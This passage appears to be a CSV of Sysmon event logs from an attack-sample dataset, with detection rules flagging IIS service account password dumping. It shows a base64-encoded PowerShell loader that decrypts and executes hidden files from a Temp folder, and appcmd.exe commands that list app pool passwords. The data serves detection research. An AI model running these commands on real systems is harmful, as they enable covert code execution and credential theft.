sAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3444
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6D-5CEB-0000-00100478FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.username'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:17.771
"
2019-05-27T01:29:17.891593+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5904,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 560
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6D-5CEB-0000-0010C47BFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:17.851
"
2019-05-27T01:29:17.971708+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5907,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3196
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6D-5CEB-0000-00108C7FFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Line Number: 0"" /text:processmodel.username'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:17.931
"
